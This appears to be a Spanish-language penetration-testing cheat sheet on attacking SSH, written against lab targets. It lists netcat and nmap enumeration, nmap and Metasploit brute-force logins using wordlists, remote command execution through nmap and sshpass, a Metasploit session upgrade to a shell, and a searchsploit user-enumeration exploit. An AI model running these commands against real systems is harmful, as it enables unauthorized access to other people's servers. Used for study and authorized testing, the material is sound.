`ssh root@192.168.1.1`        *connection*

### Netcat (nc)

>nc 192.168.1.1 22        //Nos intenamos conectar y nos muestra la versión SSH y el SO

Nmap: >nmap 192.168.1.1 -p 22 --script ssh2-enu-alogs     //enumera algoritmos del SSH

>nmap 192.168.1.1 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full   //hostkey o clave pública del SSH

>nmap 192.168.1.1 -p 22 --script ssh-auth-methods --script-args=”ssh.user=admin” //Busca los metodos de autenticación para el usuario “admin”. Si no tiene método significa que se puede ingresar sin contraseña.

>nmap 192.168.1.1 -p 22 --script=ssh-run --script-args=”ssh-run.cmd=cat /home/student/ARCHIVO.txt, ssh-run.username=student, shh-run.password=’’  //corre comandos desde nmap en la sesión de SSH.

>nmap --script ssh-brute -p22 --script-args userdb=/kali/users  192.168.1.100 //Puede ser IP o dominio, previamente users debe ser creado con la lista de usuarios. Por defecto los password que usa nmap están en "/usr/share/nmap/nselib/data/passwords.lst".

### Metasploit

>msfconsole -q                 //quite mode, sin interfaz

msf6>use auxiliary/scanner/ssh/ssh_login                //usamos el auxiliar ssh_login y sus parámetros: 

set RHOSTS demo.ine.local
set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
set STOP_ON_SUCCESS true
set verbose true
msf6>exploit                        //iniciamos el ataque
msf6>sessions                //vemos las sesiones iniciadas en ssh explotado

### OpenSHH

Probamos tener las credenciales con Hydra

Al intentar conectarnos como administrator, tal vez esté bloqueada la conexión a esta cuenta. Usamos el módulo ssh_module

|                                         |                                                                                  |
| --------------------------------------- | -------------------------------------------------------------------------------- |
| Msf>use auxiliary/scanner/ssh/ssh_login | Nos logueamos a SSH por metasploit                                               |
| Msf>sessions -u 1                       | Para upgrate nuestras sesión, puede estar bloqueada por la arquitectura del host |
| SSH>bash                                | Nos muestra el shell de CMD desde SSH                                            |
### Sshpass
`$sshpass -p 'CIA' ssh nicky@172.16.1.129 'ping -c 1 172.16.1.129'` *Run commands y using a SSH session (it's important to get fingerprint before)*

## SSH User enumaration
If OpenSSH is less than 7.7
![[Pasted image 20240321181035.png]]

`$searchsploit -m linux/remote/45939.py` *we can avoid error message with 2>/dev/null*

![[Pasted image 20240321190844.png]]
If it's show that all users are valid, then vulnerability is not present.